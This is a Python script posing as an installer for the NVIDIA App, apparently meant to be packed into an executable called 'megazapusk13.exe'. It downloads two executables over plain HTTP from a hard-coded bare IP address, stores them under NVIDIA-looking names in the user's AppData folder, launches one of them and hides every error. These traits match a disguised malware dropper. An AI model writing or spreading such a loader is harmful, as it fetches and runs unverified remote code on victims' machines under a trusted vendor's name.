#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Initial installer/loader for NVIDIA App + updater.

Tasks:
- Download latest nvidia_app.exe and updater.exe from server into %APPDATA%\\NVIDIA
- Run updater.exe /first-run
- Exit

This script will be built into megazapusk13.exe and can be placed anywhere.
"""

import os
import sys
import urllib.request
import shutil
import subprocess

BASE_URL = os.environ.get("NVIDIA_APP_BASE_URL") or "http://164.215.97.151/nvidia-app"


def get_appdata_nvidia_dir() -> str:
    appdata = os.environ.get("APPDATA") or os.path.expanduser("~")
    target = os.path.join(appdata, "NVIDIA")
    os.makedirs(target, exist_ok=True)
    return target


def download_file(url: str, dst_path: str) -> None:
    tmp_path = dst_path + ".download"
    os.makedirs(os.path.dirname(dst_path), exist_ok=True)

    with urllib.request.urlopen(url) as resp, open(tmp_path, "wb") as out_f:
        shutil.copyfileobj(resp, out_f)

    if os.path.exists(dst_path):
        try:
            os.remove(dst_path)
        except OSError:
            pass
    os.replace(tmp_path, dst_path)


def main() -> None:
    base_dir = get_appdata_nvidia_dir()

    app_exe = os.path.join(base_dir, "NVIDIA App.exe")
    updater_exe = os.path.join(base_dir, "updater.exe")

    base_url = BASE_URL.rstrip("/")

    # Download NVIDIA App binary
    app_url = base_url + "/nvidia_app.exe"
    # Download updater binary
    updater_url = base_url + "/updater.exe"

    try:
        download_file(app_url, app_exe)
        download_file(updater_url, updater_exe)
    except Exception:
        # If initial download fails, nothing to run; just exit silently
        return

    # Start updater in first-run mode
    try:
        subprocess.Popen([updater_exe, "/first-run"], cwd=base_dir)
    except Exception:
        pass


if __name__ == "__main__":
    main()
